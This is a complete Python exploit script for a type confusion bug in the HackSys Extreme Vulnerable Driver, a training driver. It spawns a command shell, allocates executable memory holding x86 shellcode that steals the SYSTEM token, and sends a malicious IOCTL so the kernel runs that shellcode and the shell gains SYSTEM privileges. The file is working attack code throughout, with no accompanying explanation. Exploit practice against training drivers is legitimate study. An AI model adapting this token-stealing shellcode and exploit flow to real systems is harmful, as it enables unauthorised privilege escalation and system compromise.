from ctypes import *
from ctypes.wintypes import *
import sys, struct, time, os

### Bitmasks ###
CREATE_NEW_CONSOLE = 0x00000010
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x00000003
FILE_ATTRIBUTE_NORMAL = 0x00000080
FILE_DEVICE_UNKNOWN = 0x00000022
FILE_ANY_ACCESS = 0x00000000
METHOD_NEITHER = 0x00000003
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
HANDLE = c_void_p
LPTSTR = c_void_p
LPBYTE = c_char_p

### WinAPI shorthand ###
CreateFile = windll.kernel32.CreateFileW
DeviceIoControl = windll.kernel32.DeviceIoControl
VirtualAlloc = windll.kernel32.VirtualAlloc
CreateProcess = windll.kernel32.CreateProcessW

### Startup info for CreateProcess API ###
class STARTUPINFO(Structure):

    _fields_ = [("cb", DWORD),
                ("lpReserved", LPTSTR),
                ("lpDesktop", LPTSTR),
                ("lpTitle", LPTSTR),
                ("dwX", DWORD),
                ("dwY", DWORD),
                ("dwXSize", DWORD),
                ("dwYSize", DWORD),
                ("dwXCountChars", DWORD),
                ("dwYCountChars", DWORD),
                ("dwFillAttribute", DWORD),
                ("dwFlags", DWORD),
                ("wShowWindow", WORD),
                ("cbReserved2", WORD),
                ("lpReserved2", LPBYTE),
                ("hStdInput", HANDLE),
                ("hStdOutput", HANDLE),
                ("hStdError", HANDLE)]

class PROCESS_INFORMATION(Structure):

    _fields_ = [("hProcess", HANDLE),
                ("hThread", HANDLE),
                ("dwProcessId", DWORD),
                ("dwThreadId", DWORD)]

### Spawn SYSTEM cmd ###
def boomHeadshot():
    print "[*]Spawning shell[*]"
    lpApplicationName = u"c:\\windows\\system32\\cmd.exe" # Unicode
    lpCommandLine = u"c:\\windows\\system32\\cmd.exe" # Unicode
    lpProcessAttributes = None
    lpThreadAttributes = None
    bInheritHandles = 0
    dwCreationFlags = CREATE_NEW_CONSOLE
    lpEnvironment = None
    lpCurrentDirectory = None
    lpStartupInfo = STARTUPINFO()
    lpStartupInfo.cb = sizeof(lpStartupInfo)
    lpProcessInformation = PROCESS_INFORMATION()

    ret = CreateProcess(lpApplicationName,           # _In_opt_      LPCTSTR
                        lpCommandLine,               # _Inout_opt_   LPTSTR
                        lpProcessAttributes,         # _In_opt_      LPSECURITY_ATTRIBUTES
                        lpThreadAttributes,          # _In_opt_      LPSECURITY_ATTRIBUTES
                        bInheritHandles,             # _In_          BOOL
                        dwCreationFlags,             # _In_          DWORD
                        lpEnvironment,               # _In_opt_      LPVOID
                        lpCurrentDirectory,          # _In_opt_      LPCTSTR
                        byref(lpStartupInfo),        # _In_          LPSTARTUPINFO
                        byref(lpProcessInformation)) # _Out_         LPPROCESS_INFORMATION
    if not ret:
        print "\t[-]Error spawning shell: " + FormatError()
        sys.exit(-1)

    time.sleep(2) # Make sure cmd.exe spawns fully before shellcode executes

    print "\t[+]Spawned with PID: %d" % lpProcessInformation.dwProcessId
    return lpProcessInformation.dwProcessId


### Stealing SYSTEM token ###
def shellcode(pid):
    tokenstealing = (
        #"\xcc"
        "\x60"                              # PUSHAD
        "\x64\x8B\x15\x24\x01\x00\x00"      # MOV EAX, FS:124       ; Kthread offset
        "\x8B\x42\x50"                      # MOV EAX, [EAX+0x50]   ; Eprocess offset
        "\x50"                              # PUSH EAX              ; Push Eprocess offset to stack to use later
        "\xBB\x04\x00\x00\x00"              # MOV EBX, 4            ; SYSTEM pid
        "\x8B\x80\xB8\x00\x00\x00"          # MOV EAX, [EAX+0xB8]   ; Next flink in ActiveProcessLink (Loop begin)
        "\x2D\xB8\x00\x00\x00"              # SUB EAX, 0xB8         ; Move that ass to the next link
        "\x39\x98\xB4\x00\x00\x00"          # CMP [EAX+0xB4], EBX   ; CMP UniqueProcessID to EBX (SYSTEM PID 4)
        "\x75\xED"                          # JNZ up                ; If not PID 4 then jump to loop start
        "\x8B\xB8\xF8\x00\x00\x00"          # MOV EDI, [EAX+0xF8]   ; Move TOKEN value of SYSTEM process to EDI
        "\x83\xE7\xF8"                      # AND EDI, FFFFFFFF8    ; Token value must be aligned by 8
        "\x58"                              # POP EAX               ; Pop Eprocess offset
        "\xBB" + struct.pack("<I", pid) +   # MOV EBX, cmdPID       ; Move the PID of cmd.exe to ebx
        "\x8B\x80\xB8\x00\x00\x00"          # MOV EAX, [EAX+0xB8]   ; Next flink in ActiveProcessLink (Loop begin)
        "\x2D\xB8\x00\x00\x00"              # SUB EAX, 0xB8         ; Move that ass to the next link
        "\x39\x98\xB4\x00\x00\x00"          # CMP [EAX+0xB4], EBX   ; CMP UniqueProcessID to EBX (cmd.exe PID)
        "\x75\xED"                          # JNZ up                ; If not cmd.exe PID then jump to loop start
        "\x89\xB8\xF8\x00\x00\x00"          # MOV [EAX+0xF8], EDI   ; Copy SYSTEM TOKEN to overwrite cmd.exe TOKEN
        "\x61"                              # POPAD
        "\xC3")                             # RETN

    print "[*]Allocating buffer for shellcode[*]"
    lpAddress = None
    dwSize = len(tokenstealing)
    flAllocationType = (MEM_COMMIT | MEM_RESERVE)
    flProtect = PAGE_EXECUTE_READWRITE

    allocateShell = VirtualAlloc(lpAddress,
                                 dwSize,
                                 flAllocationType,
                                 flProtect)

    if not allocateShell:
        print "\t[-]Error allocating shellcode: " + FormatError()
        sys.exit(-1)

    print "\t[+]Shellcode buffer allocated at 0x%x" % allocateShell
    memmove(allocateShell, tokenstealing, len(tokenstealing))
    return allocateShell

### Get handle for driver and return ###
def gethandle():
    print "[*]Getting device handle[*]"
    lpFileName = u"\\\\.\\HackSysExtremeVulnerableDriver"
    dwDesiredAccess = (GENERIC_READ | GENERIC_WRITE)
    dwShareMode = 0
    lpSecurityAttributes = None
    dwCreationDisposition = OPEN_EXISTING
    dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
    hTemplateFile = None

    handle = CreateFile(lpFileName,
                         dwDesiredAccess,
                         dwShareMode,
                         lpSecurityAttributes,
                         dwCreationDisposition,
                         dwFlagsAndAttributes,
                         hTemplateFile)

    if not handle or handle == -1:
            print"\t[-]Error getting device handle: " + FormatError()
            sys.exit(-1)

    print "\t[+]Got device handle: 0x%x" % handle
    return handle

def ctl_code(function,
             devicetype=FILE_DEVICE_UNKNOWN,
             access=FILE_ANY_ACCESS,
             method=METHOD_NEITHER):
        return ((devicetype << 16) | (access << 14) | (function << 2) | method)

### Create buffer and send IOCTL ###
def trigger(hDevice, dwIoControlCode, shelladdr):
    print "[*]Sending malicious IOCTL..."
    inbuff = create_string_buffer("\x41\x41\x41\x41" + struct.pack("<L", shelladdr))
    lpInBuffer = addressof(inbuff)
    nInBufferSize = 8
    lpOutBuffer = None
    nOutBufferSize = 0
    lpBytesReturned = byref(c_ulong())
    lpOverlapped = None
    pwnd = DeviceIoControl(hDevice,             # _In_        HANDLE
                           dwIoControlCode,     # _In_        DWORD
                           lpInBuffer,          # _In_opt_    LPVOID
                           nInBufferSize,       # _In_        DWORD
                           lpOutBuffer,         # _Out_opt_   LPVOID
                           nOutBufferSize,      # _In_        DWORD
                           lpBytesReturned,     # _Out_opt_   LPDWORD
                           lpOverlapped)        # _Inout_opt_ LPOVERLAPPED

    if not pwnd:
        print "\t[-]Error: You failed\n" + FormatError()
        sys.exit(-1)
    print "\t[+]Enjoy system shellz"

if __name__ == "__main__":
        print "\nType Confusion\n"
        pid = boomHeadshot()
        shelladdr = shellcode(pid)
        trigger(gethandle(), ctl_code(0x808), shelladdr)
